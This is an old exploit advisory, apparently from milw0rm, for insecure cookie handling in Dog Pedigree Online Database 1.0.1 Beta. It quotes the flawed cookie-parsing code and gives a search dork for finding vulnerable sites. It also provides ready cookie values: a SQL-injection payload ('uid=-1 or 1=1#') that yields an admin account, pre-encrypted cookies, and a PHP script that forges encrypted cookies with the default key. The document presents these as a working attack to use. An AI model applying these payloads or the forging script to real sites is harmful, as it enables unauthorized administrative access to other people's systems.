<html><head><title>Dog Pedigree Online Database 1.0.1b Insecure Cookie Handling Vuln</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	     INSECURE COOKIE HANDLING VULNERABILITIES		      	     |
|--------------------------------------------------------------------------------------------|
|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		     |
|  CMS INFORMATION:	 -------------------------------------------------	             |
|										             |
|--&gt;WEB: http://thewhippetarchives.net/twa_is_offline.php          	                     |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                     |
|--&gt;DEMO: N/A   	     			    					     |
|--&gt;CATEGORY: Genealogy									     |
|--&gt;DESCRIPTION: This project allows to setup and maintain a database for 	 	     |
|		collecting (dog) pedigrees. The data will actually be collected...	     |
|--&gt;RELEASED: 2009-01-25								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3								     |
|--&gt;DORK: inurl:&quot;printable_pedigree.php&quot;				                     |
|--&gt;CATEGORY: COOKIE AUTH-BYPASS (SQLi) / INSECURE COOKIE HANDLING                           |
|--&gt;AFFECT VERSION: &lt;= 1.0.1 Beta			 			             |
|--&gt;Discovered Bug date: 2009-05-08							     |
|--&gt;Reported Bug date: 2009-05-08							     |
|--&gt;Fixed bug date: 2009-05-12								     |
|--&gt;Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#######
///////

INTRO:

///////
#######


Cookie name --&gt; it could be configured, but any web change it.

Cookie protection --&gt; Active by default, but some Webs use it and other neither (Because it needs php_mcrypt extension).

With cookie protection --&gt; Any web change the $COOKIE_KEY value. Always by default



###########################
///////////////////////////

COOKIE AUTH-BYPASS (SQLi):

///////////////////////////
###########################


-----------
VULN FILE:
-----------


Path --&gt; [HOME_PATH]/php_users/htdocs/
File --&gt; users.php.inc
Vuln function --&gt; init()


 function init() {

....

    $cookie = $_COOKIE[$USER_COOKIE];
    if (isset($COOKIE_KEY)) {
      	$iv = mcrypt_create_iv(mcrypt_get_iv_size (MCRYPT_BLOWFISH, MCRYPT_MODE_ECB), MCRYPT_RAND);
      	$cookie = mcrypt_decrypt(MCRYPT_BLOWFISH, $COOKIE_KEY, base64_decode($cookie), MCRYPT_MODE_ECB, $iv);
    }
    $cookie = rtrim($cookie);  
    $a = split('&amp;', $cookie);
    $i = 0;
    while ($i &lt; count($a)) {
      $b = split ('=', $a[$i]);
      $key = urldecode($b[0]);
      $value = urldecode($b[1]);
      $this-&gt;{$key} = $value;
      $i++;
    }
    $this-&gt;id = $this-&gt;{'uid'};
  }

...

---------
EXPLOIT:
---------


1.-WITHOUT ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; email=&amp;uid=-1%20or%201=1#&amp;seclev=


2.-WITH ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; Ffq9xizFlqX%2FLFytv2XsUILuolhabq3%2BN5A0%2B3ifmNdjLEIqh%2BKIXA%3D%3D

			

Return --&gt; Admin account.


##########################
//////////////////////////

INSECURE COOKIE HANDLING:

//////////////////////////
##########################


&lt;&lt;&lt;&lt;-------+++++++++ Condition: Search e-mail and uid (it's not difficult) ++++++++++---------&gt;&gt;&gt;&gt;


------
NOTE:
------


Use an cookie builder (need php_mcrypt extension) 
to encrypt the cookie value:

&lt;?php

//Configure [real_email] and [real_uid] with your target

$COOKIE_KEY=&quot;somethingRAndoM9871234whateveryoulike&quot;; //user.conf by default
$cookie=&quot;email=&quot;.urlencode('[real_email]').&quot;&amp;uid=[real_uid]&amp;seclev=1&quot;;
$iv = mcrypt_create_iv(mcrypt_get_iv_size (MCRYPT_BLOWFISH, MCRYPT_MODE_ECB), MCRYPT_RAND);
$cookie = base64_encode(mcrypt_encrypt (MCRYPT_BLOWFISH, $COOKIE_KEY, $cookie, MCRYPT_MODE_ECB, $iv));
print &quot;Cookie crypted-urlencode --&gt;&quot;.urlencode($cookie).&quot;\n&quot;;

?&gt;


-----
PoC:
-----


1.-WITHOUT ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; email=[real_email]&amp;uid=[real_uid]&amp;seclev=1


2.-WITH ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; Use PHP script above


---------
EXPLOIT:
---------


1.-WITHOUT ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; email=y3nh4ck3r@gmail.com&amp;uid=2422&amp;seclev=1


2.-WITH ENCRYPTION:


Add cookie --&gt; Name ~&gt; dogarchive_user_info

	   --&gt; Value ~&gt; 7O%2By0gnSt4KItondpdwQThDciQY6aR3QfFGEvZQzUGQWNkYwIUI4lfiZ1WQgnEc%2B



&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!



#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-05-19]</pre></html>